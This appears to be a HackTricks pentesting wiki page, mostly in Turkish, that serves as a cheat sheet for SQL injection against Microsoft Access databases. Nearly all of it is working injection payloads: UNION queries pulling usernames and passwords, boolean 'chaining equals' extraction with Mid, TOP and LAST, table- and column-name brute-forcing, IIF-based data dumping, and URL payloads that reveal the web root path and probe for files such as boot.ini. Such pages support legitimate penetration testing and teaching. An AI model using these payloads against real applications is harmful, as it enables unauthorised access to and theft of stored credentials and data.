# MS Access SQL Injection

{{#include ../../banners/hacktricks-training.md}}

## Online Playground

- [https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1)

## DB Limitations

### String Concatenation

String birleştirme `& (%26)` ve `+ (%2b)` karakterleri ile mümkündür.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Yorumlar

MS Access'te yorum yoktur, ancak görünüşe göre bir sorgunun sonunu NULL karakteri ile kaldırmak mümkündür:
```sql
1' union select 1,2 from table%00
```
Eğer bu çalışmıyorsa, sorgunun sözdizimini her zaman düzeltebilirsiniz:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

Desteklenmiyorlar.

### LIMIT

**`LIMIT`** operatörü **uygulanmamıştır**. Ancak, SELECT sorgu sonuçlarını **ilk N tablo satırı ile sınırlamak mümkündür, `TOP` operatörünü kullanarak**. `TOP`, döndürülecek satır sayısını temsil eden bir tam sayı argümanı alır.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Just like TOP you can use **`LAST`** which will get the **satırları sonundan**.

## UNION Sorguları/Alt sorgular

Bir SQLi'de genellikle diğer tablolardan bilgi çıkarmak için yeni bir sorgu çalıştırmak istersiniz. MS Access her zaman **alt sorgularda veya ek sorgularda bir `FROM` belirtilmesini** gerektirir.\
Bu nedenle, bir `UNION SELECT` veya `UNION ALL SELECT` veya bir koşul içinde parantez içindeki bir `SELECT` çalıştırmak istiyorsanız, her zaman **geçerli bir tablo adı ile bir `FROM` belirtmeniz gerekir**.\
Bu nedenle, **geçerli bir tablo adını** bilmeniz gerekir.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

> [!WARNING]
> Bu, mevcut tablonun değerlerini tablonun adını bilmeden dışa aktarmanıza olanak tanır.

**MS Access**, **`'1'=2='3'='asd'=false`** gibi **garip sözdizimlerine** izin verir. Genellikle SQL enjeksiyonu bir **`WHERE`** ifadesinin içinde olacağından bunu kötüye kullanabiliriz.

Bir MS Access veritabanında bir SQLi'ye sahip olduğunuzu ve bir **sütun adının username** olduğunu bildiğinizi (veya tahmin ettiğinizi) hayal edin ve dışa aktarmak istediğiniz alan bu. Chaining equals tekniği kullanıldığında web uygulamasının farklı yanıtlarını kontrol edebilir ve **Mid** fonksiyonunu kullanarak alt dizeleri elde etmek için potansiyel olarak bir **boolean injection** ile içerik dışa aktarabilirsiniz.
```sql
'=(Mid(username,1,3)='adm')='
```
Eğer **tablonun adını** ve **dökülecek sütunu** biliyorsanız, `Mid`, `LAST` ve `TOP` kombinasyonunu kullanarak **tüm bilgileri sızdırmak** için boolean SQLi kullanabilirsiniz:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Tablo İsimlerini Brute-force Etme

Chaining equals tekniğini kullanarak, **tablo isimlerini brute-force** etmek için şöyle bir şey yapabilirsiniz:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Ayrıca daha geleneksel bir yol da kullanabilirsiniz:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

- Sqlmap yaygın tablo adları: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html) adresinde başka bir liste bulunmaktadır.

### Sütun adlarını Brute-Force ile Bulma

Mevcut sütun adlarını **brute-force** yöntemiyle eşitlik zinciri hilesi ile bulabilirsiniz:
```sql
'=column_name='
```
Veya **group by** ile:
```sql
-1' GROUP BY column_name%00
```
Veya **farklı bir tablonun** sütun adlarını brute-force ile bulabilirsiniz:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Veri Dökümü

Zaten [**eşitleri zincirleme tekniği**](ms-access-sql-injection.md#chaining-equals-+-substring) **ile mevcut ve diğer tablolardan veri dökme** konusunu tartıştık. Ancak başka yollar da var:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
Kısacası, sorgu bir “if-then” ifadesi kullanarak başarı durumunda “200 OK” veya aksi takdirde “500 Internal Error” tetikler. TOP 10 operatöründen faydalanarak, ilk on sonucu seçmek mümkündür. Ardından LAST kullanımı, yalnızca 10. tuple'ı dikkate almayı sağlar. Bu değerde, MID operatörünü kullanarak basit bir karakter karşılaştırması yapmak mümkündür. MID ve TOP'un indeksini uygun şekilde değiştirerek, “username” alanının içeriğini tüm satırlar için dökebiliriz.

### Zaman Tabanlı

Check [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](<https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN>)

### Diğer İlginç Fonksiyonlar

- `Mid('admin',1,1)` konum 1'den 1 uzunluğunda alt dize alır (başlangıç konumu 1'dir)
- `LEN('1234')` dize uzunluğunu alır
- `ASC('A')` karakterin ascii değerini alır
- `CHR(65)` ascii değerinden dize alır
- `IIF(1=1,'a','b')` eğer o zaman
- `COUNT(*)` öğe sayısını sayar

## Tabloları Sayma

[**buradan**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) tablo adlarını almak için bir sorgu görebilirsiniz:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Ancak, `MSysObjects` tablosunu okuma erişiminiz olmadığında SQL Enjeksiyonları bulmanın çok tipik olduğunu unutmayın.

## Dosya Sistemi Erişimi

### Web Kök Dizin Tam Yolu

**Web kök mutlak yolunun bilgisi, daha fazla saldırıyı kolaylaştırabilir**. Uygulama hataları tamamen gizlenmemişse, dizin yolu, var olmayan bir veritabanından veri seçmeye çalışarak ortaya çıkarılabilir.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access, **web dizin tam yolunu içeren bir hata mesajı** ile yanıt verir.

### Dosya Sayımı

Aşağıdaki saldırı vektörü, **uzaktaki dosya sisteminde bir dosyanın varlığını çıkarım yapmak için** kullanılabilir. Belirtilen dosya mevcutsa, MS Access, veritabanı formatının geçersiz olduğunu bildiren bir hata mesajı tetikler:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Dosyaları saymanın bir diğer yolu, **bir veritabanı.tablosu öğesi belirtmektir**. **Eğer** belirtilen **dosya mevcutsa**, MS Access, **veritabanı format hatası mesajı** gösterir.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb Dosya Adı Tahmini

**Veritabanı dosya adı (.mdb)** aşağıdaki sorgu ile çıkarılabilir:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Burada **name\[i] bir .mdb dosya adıdır** ve **realTable, veritabanı içinde mevcut bir tablodur**. MS Access her zaman bir hata mesajı tetikleyecek olsa da, geçersiz bir dosya adı ile geçerli bir .mdb dosya adını ayırt etmek mümkündür.

### .mdb Şifre Kırıcı

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html), Microsoft Access 95/97/2000/XP veya Jet Database Engine 3.0/4.0'ın ana veritabanı şifresini kurtarmak için kullanılabilecek ücretsiz bir araçtır.

## Referanslar

- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{{#include ../../banners/hacktricks-training.md}}
